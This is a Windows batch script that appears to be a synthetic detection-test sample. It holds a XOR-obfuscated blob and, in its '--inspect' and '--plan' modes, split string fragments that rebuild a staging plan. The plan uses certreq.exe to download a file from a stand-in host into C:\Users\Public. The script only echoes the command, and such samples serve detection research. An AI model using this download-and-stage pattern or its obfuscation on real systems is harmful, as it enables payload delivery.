@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:plain_fragments|reverse_xor
rem HUNTRESS-MATERIAL:R1JXHQZXAAADVgsCAQceVlRSR0BvUVJ/QEBWQUddRntvUFpfUUZjb0BBVkBmbwlwDltHUkNsVl9aVU9HUlcdAQAAVlFXVwEcV1pfUkVdWh1WX0NeUktWHQZXAAADVgsCAQccHAlAQ0dHWw5fQUZPBlcAAANWCwIBBx5dVFpSQ15SUA5XWmxdVFpSQ15SUE9WXVxdDlZUUkZUXVJfbEdLVl1PVl9UXVpADltDUkFUTwIOR11GXFBsVlRSR0BPVktWHUJWQUdBVlAOQVZHQ1JXUk9WX1pVbFZHWkFEH1ZHXF5WQWxWQVpGQlBSDkBDVkdATwIORQ==
rem HUNTRESS-EXTENSION:cmd
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "h0=v=1|steps=acquire_remote,write_file|adapter=certreq.exe|stage"
set "h1=_count=1|graph=single|next_language=none|campaign_id=campaign"
set "h2=-4218e033d5|url=https://4218e033d5.example.invalid/2ddbe332.d"
set "h3=at|file_path=C:\Users\Public\HuntressLab\stage-4218e033d5.dat"
goto :HUNTRESS_SEPARATOR_DONE
(ver >nul) || (rem HUNTRESS separator double pipe)
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
call set "cfg=%%h0%%%%h1%%%%h2%%%%h3%%"
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo certreq.exe acquire https://4218e033d5.example.invalid/2ddbe332.dat to C:\Users\Public\HuntressLab\stage-4218e033d5.dat
exit /b 0
